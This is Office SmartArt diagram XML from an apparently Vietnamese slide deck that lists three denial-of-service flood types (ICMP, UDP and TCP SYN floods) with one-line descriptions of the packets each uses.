    <dgm:cxn modelId="{8B9D4070-B4CC-F34F-B8B4-4F4F74F1B1AC}" srcId="{3234AAA2-C82A-B44F-87E5-BD58BA054E0F}" destId="{02DC4651-8C6F-6447-9B8F-D57C357757EB}" srcOrd="0" destOrd="0" parTransId="{CC53E30A-CA09-8949-8B35-41834609C58A}" sibTransId="{2EFD9D0C-B667-974D-8EEE-876172C6068D}"/>
    <dgm:cxn modelId="{64632D81-51A2-6B4B-9F06-658DFD074D36}" srcId="{59372874-7672-E146-A97A-F29BFB4A2140}" destId="{F9308F1A-1492-F14D-AA25-68EB847A0DB3}" srcOrd="1" destOrd="0" parTransId="{6587E665-7412-CC4B-8376-E44CFD4886EF}" sibTransId="{91D74F09-50FE-8A4E-8C86-D04F1C2F50FB}"/>
    <dgm:cxn modelId="{4CD5B385-F4AE-6B4E-A557-3E5FBE186B3A}" srcId="{CDE7C5DF-1F4E-144D-B3C6-CCDDA29A64DD}" destId="{59372874-7672-E146-A97A-F29BFB4A2140}" srcOrd="0" destOrd="0" parTransId="{AFA358CC-DE03-B14E-9AD6-513B9ED3EF89}" sibTransId="{EF9C2E62-DCA0-D848-903A-2D9F9C026F51}"/>
    <dgm:cxn modelId="{7557168B-73C6-4404-ABD1-F3A11CA4E00F}" srcId="{59372874-7672-E146-A97A-F29BFB4A2140}" destId="{D7B7FD62-1AF5-4A2F-BF26-C553AD1C9EF2}" srcOrd="2" destOrd="0" parTransId="{C77916B4-271F-4B5C-B822-FF7FCC23748C}" sibTransId="{81B44C3D-5D58-4EC9-A7C5-9B7EDACABF97}"/>
    <dgm:cxn modelId="{B21B7191-69B9-4A42-B0E7-F084D2A193DD}" type="presOf" srcId="{00FB880C-DCFD-49FC-9FE3-F74D6B37F6BF}" destId="{485F3DDF-2E91-40E1-9783-AA7B6A3AF28C}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{98DE5C93-DBEB-254C-B03C-54648A10B03D}" type="presOf" srcId="{59372874-7672-E146-A97A-F29BFB4A2140}" destId="{1F9EAEE1-B141-8149-B598-A2FC9726C17B}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{F77E5695-516A-4BA7-9F27-6D6283EA8D6C}" srcId="{92F30862-F847-FC4F-9375-31010EECD883}" destId="{00FB880C-DCFD-49FC-9FE3-F74D6B37F6BF}" srcOrd="1" destOrd="0" parTransId="{82EE91AC-0BFF-4DF9-AE3D-DC6645F4CB15}" sibTransId="{6782960E-9B8F-44D6-B17D-3C52D07BF4C4}"/>
    <dgm:cxn modelId="{1A1F4AB0-7DF5-44CE-A411-02C65191EAE7}" type="presOf" srcId="{D7B7FD62-1AF5-4A2F-BF26-C553AD1C9EF2}" destId="{CC58C958-26F6-42BD-B11C-953A51DACB19}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{752AFBC6-0A6F-E64D-8873-6214DED38720}" srcId="{CDE7C5DF-1F4E-144D-B3C6-CCDDA29A64DD}" destId="{3234AAA2-C82A-B44F-87E5-BD58BA054E0F}" srcOrd="2" destOrd="0" parTransId="{E5862108-903B-1C4B-9377-81DD29E52B29}" sibTransId="{B6EE5F2B-A910-414E-A3BF-34358F619072}"/>
    <dgm:cxn modelId="{21896DD5-9159-5A48-95C3-0628E40AD5D5}" srcId="{92F30862-F847-FC4F-9375-31010EECD883}" destId="{BD3D1B08-BA2C-A847-81FA-0E907AC86072}" srcOrd="0" destOrd="0" parTransId="{47925BA2-F0AA-1349-914E-93DB729B1439}" sibTransId="{DEA69FE8-A421-8F40-BC0D-0B81014C6103}"/>
    <dgm:cxn modelId="{09ECF6DD-E119-374A-AA19-1EFBB9A7AE59}" srcId="{CDE7C5DF-1F4E-144D-B3C6-CCDDA29A64DD}" destId="{92F30862-F847-FC4F-9375-31010EECD883}" srcOrd="1" destOrd="0" parTransId="{70431AB4-DF3F-4645-82B4-916A5B03ED2B}" sibTransId="{BC376F47-B3AB-B74F-80ED-DB7222180FD2}"/>
    <dgm:cxn modelId="{0DFD91DF-68AD-E649-B09C-E5EAFAEF15BB}" type="presOf" srcId="{BD3D1B08-BA2C-A847-81FA-0E907AC86072}" destId="{331622DA-667B-3D42-86F2-0516235F2E15}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{CE6F23E2-A7A9-1447-B201-56CC65F45CC6}" type="presOf" srcId="{92F30862-F847-FC4F-9375-31010EECD883}" destId="{200D4077-F322-A54F-A959-16520676AF19}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{9D4DE0EB-08A6-3544-A58B-08122AF0FDBE}" type="presOf" srcId="{92F30862-F847-FC4F-9375-31010EECD883}" destId="{E415A12E-187B-9149-B76A-23CD314DDAC8}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{791A79EE-56E7-A044-A12E-44CBF852734D}" type="presOf" srcId="{3234AAA2-C82A-B44F-87E5-BD58BA054E0F}" destId="{1EA47F75-BED3-5244-AD77-D9664E47C6FF}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{5AACC05E-5AB9-0E49-99B2-6E1BA6A41FDB}" type="presParOf" srcId="{635717B1-99B8-854E-8F70-444337E2E550}" destId="{EE209E84-B891-3047-A320-4AEEC3330BB8}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{9FAD7FA9-8F47-104B-A9DC-EA081AA4F40E}" type="presParOf" srcId="{EE209E84-B891-3047-A320-4AEEC3330BB8}" destId="{1F9EAEE1-B141-8149-B598-A2FC9726C17B}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{C8412F36-AC01-7A44-9697-143DB9CEC9BA}" type="presParOf" srcId="{EE209E84-B891-3047-A320-4AEEC3330BB8}" destId="{E367BE70-C50A-6A43-8AFA-7CF7E142477B}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{EA56AD11-7104-9640-9FC3-D2804E8F4001}" type="presParOf" srcId="{EE209E84-B891-3047-A320-4AEEC3330BB8}" destId="{6AC02209-CF3A-0249-91E1-9F1A42D58FAE}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{46A30A50-3737-8B4D-B495-F1122505DBF8}" type="presParOf" srcId="{6AC02209-CF3A-0249-91E1-9F1A42D58FAE}" destId="{7EE38C84-00CF-1247-9F8C-618383AEFFBD}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{ACB3255D-F798-B843-9790-95F14015FF43}" type="presParOf" srcId="{7EE38C84-00CF-1247-9F8C-618383AEFFBD}" destId="{E1C9B790-AD02-DB4B-90E8-7BFEE9B60B8A}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{E754EB58-08C0-E14D-AAC5-D1578D9E5664}" type="presParOf" srcId="{7EE38C84-00CF-1247-9F8C-618383AEFFBD}" destId="{FD11D5FD-18A1-A246-9B5B-AC50BEFA8723}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{813D1571-0E72-644F-A07F-89F6473710DF}" type="presParOf" srcId="{7EE38C84-00CF-1247-9F8C-618383AEFFBD}" destId="{9C0BB106-18F0-064A-9F7C-7245A6EA83E6}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{AA029F11-BB0E-4D01-99CB-F63A1F71A966}" type="presParOf" srcId="{7EE38C84-00CF-1247-9F8C-618383AEFFBD}" destId="{72550918-B5AF-4D82-9D36-A65BF6B17CE2}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{BCF06414-E512-474B-9D14-98920056AF54}" type="presParOf" srcId="{7EE38C84-00CF-1247-9F8C-618383AEFFBD}" destId="{CC58C958-26F6-42BD-B11C-953A51DACB19}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{D328F87F-21F5-714F-9FB7-F211915773E5}" type="presParOf" srcId="{635717B1-99B8-854E-8F70-444337E2E550}" destId="{12284197-3CBC-A34B-949D-A231607C1E8B}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{BCE740ED-04BF-434E-8FEA-78F3668C6118}" type="presParOf" srcId="{635717B1-99B8-854E-8F70-444337E2E550}" destId="{B431EFE1-C863-1C48-A3AC-77CE92A996E4}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{BBE8E148-330B-2A45-91F3-7D6EB629A869}" type="presParOf" srcId="{B431EFE1-C863-1C48-A3AC-77CE92A996E4}" destId="{200D4077-F322-A54F-A959-16520676AF19}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{CB56E221-F88E-FD47-9496-8D41D0D28A88}" type="presParOf" srcId="{B431EFE1-C863-1C48-A3AC-77CE92A996E4}" destId="{E415A12E-187B-9149-B76A-23CD314DDAC8}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{58069DFD-337B-484D-81D4-6343DAFF6EED}" type="presParOf" srcId="{B431EFE1-C863-1C48-A3AC-77CE92A996E4}" destId="{834C08AE-444E-F446-B0BF-3487CD228505}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{6B826E0E-A1E1-9D4F-9A76-1A15C480919D}" type="presParOf" srcId="{834C08AE-444E-F446-B0BF-3487CD228505}" destId="{534131B6-A042-2F47-B9FB-6D8DAFBA1F6D}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{14577FE3-E79A-1949-B26E-0D485D2BD999}" type="presParOf" srcId="{534131B6-A042-2F47-B9FB-6D8DAFBA1F6D}" destId="{331622DA-667B-3D42-86F2-0516235F2E15}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{36982C0C-8F60-4102-94F4-BD995E8B336A}" type="presParOf" srcId="{534131B6-A042-2F47-B9FB-6D8DAFBA1F6D}" destId="{81D1A887-8039-40A1-A406-4AE4BCC6EFA1}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{5221E85A-6E1D-4E32-86B3-D1609F308ADD}" type="presParOf" srcId="{534131B6-A042-2F47-B9FB-6D8DAFBA1F6D}" destId="{485F3DDF-2E91-40E1-9783-AA7B6A3AF28C}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{C7F4E4E1-9BE9-DD45-B710-B33855AEC625}" type="presParOf" srcId="{635717B1-99B8-854E-8F70-444337E2E550}" destId="{237E2EFB-A677-D844-819C-BBDED44A17C5}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{E68A7686-B35C-E54D-A2AA-94895E1983D7}" type="presParOf" srcId="{635717B1-99B8-854E-8F70-444337E2E550}" destId="{49A3A6F1-0ADA-9941-AEE8-8E3D396BEBB6}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{C4DC8DD8-8E37-A449-AF53-8C2D54A3BADC}" type="presParOf" srcId="{49A3A6F1-0ADA-9941-AEE8-8E3D396BEBB6}" destId="{1EA47F75-BED3-5244-AD77-D9664E47C6FF}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{4903066D-4C63-D442-B313-F0A620CD3979}" type="presParOf" srcId="{49A3A6F1-0ADA-9941-AEE8-8E3D396BEBB6}" destId="{DE64535E-28E3-9144-82ED-ED0F42D2AAEE}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{A4CFDEB2-3173-414C-8A15-BB6822B38D19}" type="presParOf" srcId="{49A3A6F1-0ADA-9941-AEE8-8E3D396BEBB6}" destId="{1D30DF71-C875-B746-BD57-739E889A911A}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{F859185D-567E-B84D-A45C-B6DA4CE3C958}" type="presParOf" srcId="{1D30DF71-C875-B746-BD57-739E889A911A}" destId="{B8BA19E8-688C-424C-829D-A7B0DEE3A1AE}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{79536E11-1C43-1E46-BFA7-2611914FE8CB}" type="presParOf" srcId="{B8BA19E8-688C-424C-829D-A7B0DEE3A1AE}" destId="{F711556B-CC33-6E40-9D5E-6524FC4A1052}" srcOrd="0"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CDE7C5DF-1F4E-144D-B3C6-CCDDA29A64DD}" type="doc">
      <dgm:prSet loTypeId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2" loCatId="list" qsTypeId="urn:microsoft.com/office/officeart/2005/8/quickstyle/simple4" qsCatId="simple" csTypeId="urn:microsoft.com/office/officeart/2005/8/colors/colorful3" csCatId="colorful" phldr="1"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{59372874-7672-E146-A97A-F29BFB4A2140}">
      <dgm:prSet phldrT="[Text]"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" b="1"/>
            <a:t>ICMP Flood</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" b="1" i="0" dirty="0">
            <a:effectLst/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{AFA358CC-DE03-B14E-9AD6-513B9ED3EF89}" type="parTrans" cxnId="{4CD5B385-F4AE-6B4E-A557-3E5FBE186B3A}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{EF9C2E62-DCA0-D848-903A-2D9F9C026F51}" type="sibTrans" cxnId="{4CD5B385-F4AE-6B4E-A557-3E5FBE186B3A}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{92F30862-F847-FC4F-9375-31010EECD883}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" b="1"/>
            <a:t>UDP Flood</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" b="1" i="0" dirty="0">
            <a:effectLst/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{70431AB4-DF3F-4645-82B4-916A5B03ED2B}" type="parTrans" cxnId="{09ECF6DD-E119-374A-AA19-1EFBB9A7AE59}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{BC376F47-B3AB-B74F-80ED-DB7222180FD2}" type="sibTrans" cxnId="{09ECF6DD-E119-374A-AA19-1EFBB9A7AE59}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{BD3D1B08-BA2C-A847-81FA-0E907AC86072}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US"/>
            <a:t>Thay thế sử dụng các gói tin UDP tới cổng ngẫu nhiên </a:t>
          </a:r>
          <a:endParaRPr lang="en-US" b="1" i="0" dirty="0">
            <a:effectLst/>
            <a:latin typeface="+mj-lt"/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{47925BA2-F0AA-1349-914E-93DB729B1439}" type="parTrans" cxnId="{21896DD5-9159-5A48-95C3-0628E40AD5D5}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{DEA69FE8-A421-8F40-BC0D-0B81014C6103}" type="sibTrans" cxnId="{21896DD5-9159-5A48-95C3-0628E40AD5D5}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{3234AAA2-C82A-B44F-87E5-BD58BA054E0F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US" b="1"/>
            <a:t>TCP SYN Flood </a:t>
          </a:r>
          <a:endParaRPr lang="en-US" b="1" i="0" dirty="0">
            <a:effectLst/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E5862108-903B-1C4B-9377-81DD29E52B29}" type="parTrans" cxnId="{752AFBC6-0A6F-E64D-8873-6214DED38720}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B6EE5F2B-A910-414E-A3BF-34358F619072}" type="sibTrans" cxnId="{752AFBC6-0A6F-E64D-8873-6214DED38720}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{02DC4651-8C6F-6447-9B8F-D57C357757EB}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US"/>
            <a:t>Gửi TCP SYN (yêu cầu kết nối) các gói dữ liệu</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" b="1" i="0" dirty="0">
            <a:effectLst/>
            <a:latin typeface="+mj-lt"/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{CC53E30A-CA09-8949-8B35-41834609C58A}" type="parTrans" cxnId="{8B9D4070-B4CC-F34F-B8B4-4F4F74F1B1AC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2EFD9D0C-B667-974D-8EEE-876172C6068D}" type="sibTrans" cxnId="{8B9D4070-B4CC-F34F-B8B4-4F4F74F1B1AC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{87CA5203-886D-476C-8773-A8952AD60B34}">
      <dgm:prSet phldrT="[Text]"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US"/>
            <a:t>Sử dụng gói ICMP</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" b="1" i="0" dirty="0">
            <a:effectLst/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{7A55C87C-9179-41CE-AB58-0581F5C13054}" type="parTrans" cxnId="{4C7687B9-48C1-4798-BD8D-B09C9810512E}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{4499DD0E-95A3-44B9-904B-72EF79CA9F34}" type="sibTrans" cxnId="{4C7687B9-48C1-4798-BD8D-B09C9810512E}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{6A904335-4CE7-4629-9C41-761C7F18C5CB}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US"/>
            <a:t>Nhưng đối với cuộc tấn công dung l</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="vi-VN" altLang="en-US"/>
            <a:t>ư</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US"/>
            <a:t>ợng</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" altLang="en-US" dirty="0"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{3CEEE5CF-C7B9-4AEF-A7B5-DA4B8B9FAD6B}" type="parTrans" cxnId="{0F31C51D-91C0-4E0B-9727-E860D9BD5093}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{CEE72160-3C69-46DB-A6AD-0BFA85FF619A}" type="sibTrans" cxnId="{0F31C51D-91C0-4E0B-9727-E860D9BD5093}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{6C2456D6-02A2-463B-84FB-58FA9BC9CCFC}">
      <dgm:prSet phldrT="[Text]"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" altLang="en-US"/>
            <a:t>Ví dụ ping (echo) request</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" b="1" i="0" dirty="0">
            <a:effectLst/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{91C50C1D-BD31-4068-8931-1663B5CE7505}" type="parTrans" cxnId="{C36C829D-A004-4028-9721-68695252CABF}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{F75DFBA4-DA8E-43C8-8428-53C14EC13100}" type="sibTrans" cxnId="{C36C829D-A004-4028-9721-68695252CABF}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{635717B1-99B8-854E-8F70-444337E2E550}" type="pres">
      <dgm:prSet presAssocID="{CDE7C5DF-1F4E-144D-B3C6-CCDDA29A64DD}" presName="theList" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{EE209E84-B891-3047-A320-4AEEC3330BB8}" type="pres">
      <dgm:prSet presAssocID="{59372874-7672-E146-A97A-F29BFB4A2140}" presName="compNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{1F9EAEE1-B141-8149-B598-A2FC9726C17B}" type="pres">
      <dgm:prSet presAssocID="{59372874-7672-E146-A97A-F29BFB4A2140}" presName="aNode" presStyleLbl="bgShp" presStyleIdx="0" presStyleCnt="3"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{E367BE70-C50A-6A43-8AFA-7CF7E142477B}" type="pres">
      <dgm:prSet presAssocID="{59372874-7672-E146-A97A-F29BFB4A2140}" presName="textNode" presStyleLbl="bgShp" presStyleIdx="0" presStyleCnt="3"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{6AC02209-CF3A-0249-91E1-9F1A42D58FAE}" type="pres">
      <dgm:prSet presAssocID="{59372874-7672-E146-A97A-F29BFB4A2140}" presName="compChildNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{7EE38C84-00CF-1247-9F8C-618383AEFFBD}" type="pres">
      <dgm:prSet presAssocID="{59372874-7672-E146-A97A-F29BFB4A2140}" presName="theInnerList" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{A9014140-D8A6-4978-AA18-33E39D13DCC3}" type="pres">
      <dgm:prSet presAssocID="{87CA5203-886D-476C-8773-A8952AD60B34}" presName="childNode" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="5">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{B09CC959-DFF6-4908-98C8-1AB0FE7625B3}" type="pres">
      <dgm:prSet presAssocID="{87CA5203-886D-476C-8773-A8952AD60B34}" presName="aSpace2" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{D4B43EB9-34A0-4A1E-B1D2-E5931E37D5D1}" type="pres">
      <dgm:prSet presAssocID="{6C2456D6-02A2-463B-84FB-58FA9BC9CCFC}" presName="childNode" presStyleLbl="node1" presStyleIdx="1" presStyleCnt="5">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{12284197-3CBC-A34B-949D-A231607C1E8B}" type="pres">
      <dgm:prSet presAssocID="{59372874-7672-E146-A97A-F29BFB4A2140}" presName="aSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{B431EFE1-C863-1C48-A3AC-77CE92A996E4}" type="pres">
      <dgm:prSet presAssocID="{92F30862-F847-FC4F-9375-31010EECD883}" presName="compNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{200D4077-F322-A54F-A959-16520676AF19}" type="pres">
      <dgm:prSet presAssocID="{92F30862-F847-FC4F-9375-31010EECD883}" presName="aNode" presStyleLbl="bgShp" presStyleIdx="1" presStyleCnt="3"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{E415A12E-187B-9149-B76A-23CD314DDAC8}" type="pres">
      <dgm:prSet presAssocID="{92F30862-F847-FC4F-9375-31010EECD883}" presName="textNode" presStyleLbl="bgShp" presStyleIdx="1" presStyleCnt="3"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{834C08AE-444E-F446-B0BF-3487CD228505}" type="pres">
      <dgm:prSet presAssocID="{92F30862-F847-FC4F-9375-31010EECD883}" presName="compChildNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{534131B6-A042-2F47-B9FB-6D8DAFBA1F6D}" type="pres">
      <dgm:prSet presAssocID="{92F30862-F847-FC4F-9375-31010EECD883}" presName="theInnerList" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{331622DA-667B-3D42-86F2-0516235F2E15}" type="pres">
